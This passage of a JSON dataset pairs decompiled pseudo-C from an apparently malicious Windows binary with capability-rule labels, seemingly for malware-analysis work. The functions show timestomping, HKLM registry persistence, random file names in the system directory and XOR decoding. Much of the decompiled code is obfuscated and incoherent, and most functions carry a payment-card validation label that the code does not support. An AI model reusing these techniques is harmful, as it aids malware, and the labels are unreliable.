        "decompiled_code": "\nbool __cdecl fcn.00404880(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00402050();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.004011f0();\n        arg_ch_01 = fcn.004011f0();\n        arg_ch_02 = fcn.004011f0();\n        fcn.004020b0(arg_10h, arg_ch_00);\n        fcn.004020b0(arg_8h, arg_ch_01);\n        fcn.004020b0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x411114, &lpBuffer, arg_10h);\n        iVar2 = fcn.004030d0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x411120, &lpBuffer, arg_8h);\n            iVar2 = fcn.004030d0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x411120, &lpBuffer, arg_ch);\n                iVar2 = fcn.004030d0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004020b0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 615
    },
    "00404d20": {
        "rules": [
            "calculate modulo 256 via x86 assembly",
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404e04) overlaps instruction at (ram,0x00404e03)\n// \n\nuint __cdecl fcn.00404d20(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    uint *puVar6;\n    uint *puVar7;\n    bool bVar8;\n    bool bVar9;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    puVar2 = fcn.00401410(arg_18h, arg_1ch, 0x411144, 7);\n    puVar1 = _sym.imp.MSVCRT.dll_rand;\n    var_4h = puVar2;\n    if (puVar2 == NULL) {\n        return 0;\n    }\n    puVar3 = NULL;\n    var_24h = 0;\n    puVar6 = &var_23h;\n    for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    bVar9 = false;\n    puVar6 = NULL;\n    bVar8 = false;\n    do {\n        if ((bVar9 == bVar8) && (bVar9 != bVar8)) {\n            uVar4 = puVar6 & 0xffffff00 | *(puVar2 + (puVar6 & 0xff));\n            puVar7 = puVar3;\n        }\n        else {\n            uVar4 = (*puVar1)();\n            iVar5 = extraout_ECX;\n            puVar7 = puVar6;\n        }\n        puVar3 = uVar4 & 0x800000ff;\n        if (puVar3 < 0) {\n            puVar3 = (puVar3 - 1U | 0xffffff00) + 1;\n        }\n        (&var_24h)[puVar7] = puVar3;\n        puVar6 = puVar7 + 1;\n        bVar9 = SBORROW4(puVar6, 0x20);\n        bVar8 = puVar7 + -0x1f < 0;\n    } while (puVar6 < 0x20);\n    if ((bVar9) || (!bVar9)) {\n        iVar5 = 8;\n        puVar6 = &var_24h;\n    }\n    else {\n        *puVar1 = *puVar6;\n        puVar6 = puVar7 + 5;\n        puVar2 = puVar1 + 1;\n    }\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar2 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00402230(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n    fcn.00403dc0(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 782
    },
    "004011f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040120e) overlaps instruction at (ram,0x0040120d)\n// \n\nint32_t __fastcall fcn.004011f0(uint param_1, ushort param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    code *pcVar5;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint *puVar9;\n    uint *unaff_EDI;\n    char *pcVar10;\n    char *pcVar11;\n    uint *puVar12;\n    bool in_ZF;\n    char *pcVar6;\n    \n    if (!in_ZF) {\n        if (in_ZF) {\n            uVar2 = in(param_2);\n            *unaff_EDI = uVar2;\n            if (*0x10 < 1) {\n                uVar3 = in_EAX + 1;\n                pcVar6 = in_EAX & 0xffffff00 | uVar3;\n                *pcVar6 = *pcVar6 + uVar3;\n                (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(uVar3);\n                uVar4 = 0xffffffff;\n                pcVar6 = unaff_EBP + -0x22c;\n                do {\n                    pcVar10 = pcVar6;\n                    if (uVar4 == 0) break;\n                    uVar4 = uVar4 - 1;\n                    pcVar10 = pcVar6 + 1;\n                    cVar1 = *pcVar6;\n                    pcVar6 = pcVar10;\n                } while (cVar1 != '\\0');\n                uVar4 = ~uVar4;\n                puVar9 = pcVar10 + -uVar4;\n                puVar12 = unaff_EBP + -0x128;\n                for (uVar7 = uVar4 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n                    *puVar12 = *puVar9;\n                    puVar9 = puVar9 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n                    *puVar12 = *puVar9;\n                    puVar9 = puVar9 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                uVar4 = 0xffffffff;\n                pcVar6 = 0x411138;\n                do {\n                    pcVar10 = pcVar6;\n                    if (uVar4 == 0) break;\n                    uVar4 = uVar4 - 1;\n                    pcVar10 = pcVar6 + 1;\n                    cVar1 = *pcVar6;\n                    pcVar6 = pcVar10;\n                } while (cVar1 != '\\0');\n                uVar4 = ~uVar4;\n                iVar8 = -1;\n                pcVar6 = unaff_EBP + -0x128;\n                do {\n                    pcVar11 = pcVar6;\n                    if (iVar8 == 0) break;\n                    iVar8 = iVar8 + -1;\n                    pcVar11 = pcVar6 + 1;\n                    cVar1 = *pcVar6;\n                    pcVar6 = pcVar11;\n                } while (cVar1 != '\\0');\n                puVar9 = pcVar10 + -uVar4;\n                puVar12 = pcVar11 + -1;\n                for (uVar7 = uVar4 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n                    *puVar12 = *puVar9;\n                    puVar9 = puVar9 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n                    *puVar12 = *puVar9;\n                    puVar9 = puVar9 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(unaff_EBP + -0x128, 0, unaff_EBP + -0x24);\n                iVar8 = unaff_EBX;\n                if (unaff_EBX == -1) {\n                    iVar8 = fcn.00402a10(*(unaff_EBP + 8));\n                    if (iVar8 == -1) {\n                        return 0;\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar8, unaff_EBP + -0x20, unaff_EBP + -0x18, unaff_EBP + -0x10);\n                if (unaff_EBX == -1) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar8);\n                }\n                return 1;\n            }\n            uVar4 = in_EAX ^ 0xdee0ed6d;\n            pcVar5 = sym.imp.MSVCRT.dll_rand + (uVar4 & 0xffff0000 | uVar4 + (uVar4 >> 8) * -0x31);\n            goto code_r0x00401214;\n        }\n    }\n    pcVar5 = (*_sym.imp.MSVCRT.dll_rand)();\ncode_r0x00401214:\n    return pcVar5 % 5 + 3;\n}\n",
        "token_count": 1236
    },
    "004014c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401517) overlaps instruction at (ram,0x00401515)\n// \n// WARNING: Removing unreachable block (ram,0x004014ea)\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.004014c0(void)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    int32_t **ppiVar4;\n    uint32_t uVar5;\n    uint8_t extraout_CH;\n    uint8_t uVar7;\n    int32_t extraout_ECX;\n    char *pcVar6;\n    uint8_t *puVar8;\n    int32_t **unaff_EBX;\n    bool bVar9;\n    char cVar10;\n    int32_t **ppiVar11;\n    int32_t **var_4h;\n    \n    ppiVar11 = 0x4111f4;\n    ppiVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4111f4);\n    var_4h = ppiVar4;\n    if (ppiVar4 == NULL) {\n        return 0;\n    }\n    while( true ) {\n        *0x423588 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(ppiVar4, ppiVar11);\n        piVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        bVar9 = false;\n        cVar10 = (extraout_CH | 0x47) == 0;\n        *0x42358c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(var_4h, 0x411220);\n        if ((bVar9) || (!bVar9)) break;\n        pcVar6 = extraout_ECX + -1;\n        if (pcVar6 == NULL || cVar10 == '\\0') {\n            iVar1 = *piVar3;\n            *var_4h = piVar3 + 1;\n            uVar5 = *0x9750e2b5;\n            puVar8 = iVar1 >> 0x1f;\n            uVar7 = iVar1 >> 0x1f;\n            *puVar8 = *puVar8 ^ uVar7;\n            puVar8 = var_4h + -1;\n            uVar2 = *puVar8;\n            *puVar8 = *puVar8 + uVar7;\n            *0x423590 = uVar5 & 0xffffff00 | -CARRY1(uVar2, uVar7);\n            goto code_r0x00401549;\n        }\n        uVar5 = *0x42358c + 1;\n        puVar8 = *0x42358c + 0x21;\n        uVar2 = *puVar8;\n        uVar7 = pcVar6 >> 8;\n        *puVar8 = *puVar8 + uVar7;\n        ppiVar4 = uVar5 & 0xffffff00 | uVar5 + *pcVar6 + CARRY1(uVar2, uVar7);\n        ppiVar11 = var_4h;\n        var_4h = unaff_EBX;\n    }\n    *0x423590 = (*piVar3)();\ncode_r0x00401549:\n    if (((*0x423588 != 0) && (*0x42358c != 0)) && (*0x423590 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 780
    },
    "00401610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401670) overlaps instruction at (ram,0x00401667)\n// \n\nvoid __cdecl fcn.00401610(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    uint8_t uVar3;\n    char cVar6;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uint8_t in_CL;\n    int32_t extraout_ECX;\n    char *pcVar7;\n    uint8_t unaff_BL;\n    int32_t unaff_EDI;\n    uchar uVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    ulong uVar10;\n    \n    if (arg_ch != 1) goto code_r0x004016a3;\n    uVar8 = 0;\n    bVar9 = (POPCOUNT((in_CL | unaff_BL) & unaff_EDI) & 1U) == 0;\n    uVar10 = fcn.00403130();\n    pcVar7 = uVar10 >> 0x20;\n    piVar4 = uVar10;\n    if (bVar9) {\ncode_r0x00401652:\n        piVar4 = fcn.00402850();\n        if (!uVar8) goto code_r0x00401659;\ncode_r0x00401670:\n        fcn.00404670();\n    }\n    else {\n        arg_ch = 1;\n        if (!bVar9) goto code_r0x00401652;\n        arg_ch = 5;\n        out(*0x1, uVar10 >> 0x20);\n        do {\n            cVar6 = piVar4 >> 8;\n            in_AF = 9 < (piVar4 & 0xf) | in_AF;\n            piVar4 = CONCAT31(CONCAT21(piVar4 >> 0x10, cVar6 - in_AF), -in_AF);\n        } while (in_AF || cVar6 == *pcVar7);\n        piVar2 = unaff_EDI + pcVar7 * 2;\n        *piVar2 = (*piVar2 + 0x7b) - in_AF;\n        *(extraout_ECX + -0x18) = piVar4;\n        *piVar4 = piVar4 + *piVar4 + 1;\n        puVar1 = pcVar7 + 0x17;\n        uVar3 = uVar10 >> 0x28;\n        uVar8 = CARRY1(*puVar1, uVar3);\n        *puVar1 = *puVar1 + uVar3;\ncode_r0x00401659:\n        if (!uVar8) goto code_r0x00401670;\n        uVar5 = piVar4 + (uVar8 == false) + 0x7c8ecb0d;\n        *(arg_ch + 0x43d1773a) = *(arg_ch + 0x43d1773a) ^ 0xe827e95e;\n        uVar3 = uVar5;\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        uVar3 = uVar3 + in_AF * -6;\n        uVar3 = uVar3 + (0x9f < uVar3 | in_AF * (uVar3 < 6)) * -0x60;\n        pcVar7 = uVar5 & 0xffffff00 | uVar3;\n        *pcVar7 = *pcVar7 + uVar3;\n    }\n    if (*0x423594 == 0) {\n        (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n        fcn.00402e20();\n    }\ncode_r0x004016a3:\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 882
    },
    "004016c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401734) overlaps instruction at (ram,0x00401731)\n// \n// WARNING: Removing unreachable block (ram,0x00401768)\n// WARNING: Removing unreachable block (ram,0x0040172b)\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004016c0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint8_t *unaff_EDI;\n    bool bVar7;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar8;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_10h._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    bVar7 = false;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        uVar4 = arg_14h;\n        do {\n            uVar3 = var_8h;\n            iVar5 = arg_10h;\n            if ((!bVar7) && (bVar7)) {\n                uVar2 = uVar4;\n                cVar1 = uVar2 - *unaff_EDI;\n                uVar8 = func_0x10187672((in_NT & 1) * 0x4000 | SBORROW1(uVar2, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200\n                                        | (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 |\n                                        (in_AF & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *unaff_EDI |\n                                        (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                                        (in_AC & 1) * 0x40000);\n                uVar3 = uVar8;\n                iVar5 = uVar8 >> 0x20;\n                unaff_EDI = unaff_EDI + 1;\n            }\n            uVar2 = *(var_ch % arg_ch + arg_8h);\n    // WARNING: Bad instruction - Truncating control flow here\n            uVar6 = var_10h ^ *(uVar3 + iVar5) ^ *((var_ch + -1) % arg_ch + arg_8h);\n            *(arg_18h + -1 + var_ch) = uVar6;\n            if (('\\0' < uVar6) && (uVar6 < '\\x01')) {\n                if (var_ch != 0) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(var_ch + arg_18h) = var_10h ^ uVar2;\n            uVar4 = var_8h + 1;\n            bVar7 = uVar4 < arg_14h;\n            var_ch = var_ch + 2;\n            var_8h = uVar4;\n        } while (uVar4 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 932
    },
    "00401b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401b98) overlaps instruction at (ram,0x00401b93)\n// \n// WARNING: Variable defined which should be unmapped: var_4h\n\nbool fcn.00401b40(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    bool bVar5;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.004026a0(&var_4h, 0);\n    bVar5 = iVar2 == 0;\n    if (bVar5) {\n        return false;\n    }\n    if ((!bVar5) && (bVar5)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4112c8, 0x411308, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 348
    },
    "00402050": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040206c) overlaps instruction at (ram,0x00402068)\n// \n// WARNING: Type propagation algorithm not settling\n\nvoid __fastcall fcn.00402050(int32_t param_1)\n\n{\n    char **in_EAX;\n    uint uVar1;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    bool in_CF;\n    char in_ZF;\n    \n    if (((!in_CF) && (in_CF)) && (param_1 != 1 && in_ZF != '\\0')) {\n        *in_EAX = *in_EAX + in_EAX;\n        *in_EAX = *in_EAX + in_EAX;\n        return;\n    }\n    *unaff_EDI = unaff_ESI + 4;\n    if (*0x9750e2b5 == -0x3f7affbe) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x42359c = 1;\n    }\n    return;\n}\n",
        "token_count": 253
    },
    "004020b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004020b0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            in_EAX = iVar1 / 0x1a;\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return in_EAX;\n}\n",
        "token_count": 158
    },
    "004021b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.004021b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401950(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 68
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.00401ae0(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00404cb0(argv),  pcVar3 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar3)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 242
    },
    "00402470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004025af) overlaps instruction at (ram,0x004025ab)\n// \n\nuint64_t __fastcall fcn.00402470(uint16_t param_1, uchar *param_2)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int16_t unaff_BX;\n    uchar *puVar9;\n    uint32_t unaff_ESI;\n    uchar *puVar10;\n    uint32_t *unaff_EDI;\n    bool in_PF;\n    bool bVar11;\n    float10 in_ST0;\n    uint64_t uVar12;\n    int32_t in_stack_5f9dff5f;\n    uint uStack32;\n    uchar uStack28;\n    uchar uStack27;\n    ushort uStack26;\n    char cStack24;\n    uchar uStack23;\n    ushort uStack22;\n    uchar uStack20;\n    uchar uStack19;\n    ushort uStack18;\n    \n    puVar9 = &stack0xfffffffc;\n    if ((!in_PF) && (puVar9 = &stack0xfffffffc,  in_PF)) {\n        uVar8 = *unaff_EDI;\n        *unaff_EDI = unaff_ESI;\n        pcVar6 = _sym.imp.USER32.dll_GetMessageA;\n        iVar3 = -in_stack_5f9dff5f;\n        puVar9 = &stack0xfffffffc + iVar3;\n        if (puVar9 < 0) {\n            uStack20 = 0x2a;\n            uStack19 = 0x24;\n            uStack18 = 0x40;\n            uVar12 = (*_sym.imp.USER32.dll_GetMessageA)();\n            pcVar5 = _sym.imp.USER32.dll_TranslateMessage;\n            pcVar4 = _sym.imp.USER32.dll_GetDesktopWindow;\n            while (uVar12 != 0) {\n                iVar1 = &uStack32 + iVar3;\n                uStack20 = iVar1;\n                uStack19 = iVar1 >> 8;\n                uStack18 = iVar1 >> 0x10;\n                cStack24 = 0x40;\n                uStack23 = 0x24;\n                uStack22 = 0x40;\n                (*pcVar5)();\n                cStack24 = 0x42;\n                uStack23 = 0x24;\n                uStack22 = 0x40;\n                (*pcVar4)();\n                iVar1 = &uStack32 + iVar3;\n                cStack24 = iVar1;\n                uStack23 = iVar1 >> 8;\n                uStack22 = iVar1 >> 0x10;\n                uStack28 = 0x4c;\n                uStack27 = 0x24;\n                uStack26 = 0x40;\n                (*_sym.imp.USER32.dll_DispatchMessageA)();\n                uStack28 = 0;\n                uStack27 = 0;\n                uStack26 = 0;\n                uStack32 = 0;\n                uVar12 = (*pcVar6)(&uStack32 + iVar3, 0);\n            }\n            return uVar12 & 0xffffffff00000000;\n        }\n        if (-1 < uVar8) goto code_r0x004024ec;\n    }\n    param_2 = *(puVar9 + 8);\n    *param_2 = 0x89;\n    param_2[1] = 0x93;\n    param_2[2] = 0xd3;\n    param_2[3] = 0xeb;\n    uVar8 = param_2 & 0x1200;\ncode_r0x004024ec:\n    uVar7 = *(puVar9 + 8);\n    *(uVar7 + 4) = 0x47;\n    if ((uVar8 != 0) && (uVar8 == 0)) {\n        uVar7 = uVar7 & 0xe2f4cc58;\n    }\n    *(uVar7 + 5) = 0xbc;\n    uVar8 = *(puVar9 + 8);\n    *(uVar8 + 6) = 0x73;\n    puVar2 = *(puVar9 + 8);\n    puVar2[7] = 0xf8;\n    puVar2[8] = 0x9d;\n    bVar11 = uVar8 != unaff_BX;\n    puVar2[9] = 0x84;\n    puVar10 = puVar2;\n    if ((bVar11) && (!bVar11)) {\n        uVar8 = uVar8 & 0xffffff00 | *0x4bb148d3;\n        puVar10 = puVar2 + 1;\n        out(*puVar2, param_2);\n    }\n    puVar10[10] = 0xfc;\n    cStack24 = uVar8;\n    bVar11 = ((param_1 + 1 & 0xff | (param_1 + 1 >> 8 & cStack24 + 2U) << 8) & 0x7bc9) == 0;\n    puVar10[0xb] = 0xfb;\n    if ((bVar11) || (!bVar11)) {\n        puVar10[0xc] = 0xfd;\n    }\n    else {\n        in_ST0 = in_ST0 - *(puVar9 + 0x46c692c9);\n        uVar8 = uVar8 | 0xfd;\n    }\n    puVar10[0xd] = 0x65;\n    bVar11 = -1 < (param_2 - 1U & param_1);\n    puVar10[0xe] = 0x8f;\n    if ((bVar11) && (!bVar11)) {\n        *(unaff_EDI + 7) = in_ST0;\n    }\n    **(puVar9 + 0xc) = 0xf;\n    return CONCAT44(param_2, uVar8);\n}\n",
        "token_count": 1348
    },
    "00402610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402669) overlaps instruction at (ram,0x00402665)\n// \n\nvoid __cdecl fcn.00402610(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint arg_ch_00;\n    uint unaff_EBX;\n    uchar *puVar2;\n    uint *unaff_ESI;\n    uint *puVar3;\n    bool bVar4;\n    bool bVar5;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar3 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    bVar4 = false;\n    bVar5 = unaff_EBX >> 8 == 'p';\n    fcn.00402470(&var_68h, &var_4h);\n    arg_ch_00 = var_4h;\n    puVar2 = &stack0xfffffffc;\n    if ((!bVar4 && !bVar5) && (puVar2 = &stack0xfffffffc,  bVar4 || bVar5)) {\n        *(puVar3 + 3) = *unaff_ESI;\n        arg_ch_00 = extraout_EDX;\n        puVar2 = 0x8be181d0;\n    }\n    fcn.00402bc0(puVar2 + -0x68, arg_ch_00, 0x407020, 0xa0e0);\n    puVar3 = *(puVar2 + 0xc);\n    **(puVar2 + 8) = 0x407020;\n    *puVar3 = 0xa0e0;\n    return;\n}\n",
        "token_count": 459
    },
    "004026a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402794) overlaps instruction at (ram,0x00402790)\n// \n// WARNING: Removing unreachable block (ram,0x00402720)\n\nint32_t __cdecl fcn.004026a0(uint arg_8h, uint *arg_ch)\n\n{\n    uint32_t *in_EAX;\n    int32_t iVar1;\n    char *pcVar2;\n    uint *in_ECX;\n    char unaff_BL;\n    int32_t *unaff_EDI;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    if ((0x31b < &stack0xfffffffc) && (0x31b >= &stack0xfffffffc)) {\n        if (*in_EAX <= &stack0xfffffcdc && in_EAX + 1 != 0) {\n            *in_ECX = 0x407020;\n            *arg_ch = 0xa0e0;\n            return in_EAX + 1;\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    piVar3 = unaff_EDI;\n    if ((-1 < iVar1) && (-1 >= iVar1)) {\n        out(0xc4, iVar1);\n        piVar3 = unaff_EDI + 1;\n        *unaff_EDI = iVar1;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 != 0) {\n        piVar4 = &var_114h;\n        pcVar2 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(piVar4, arg_8h);\n        if (pcVar2 != NULL) {\n            if ((pcVar2 < 1) || (0 < pcVar2)) {\n                pcVar2 = 0x1;\n                piVar3 = piVar4;\n            }\n            *pcVar2 = *pcVar2 + pcVar2;\n            *(piVar3 + -0x75) = *(piVar3 + -0x75) + unaff_BL;\n            iVar1 = in(0x5d);\n            return iVar1;\n        }\n        return 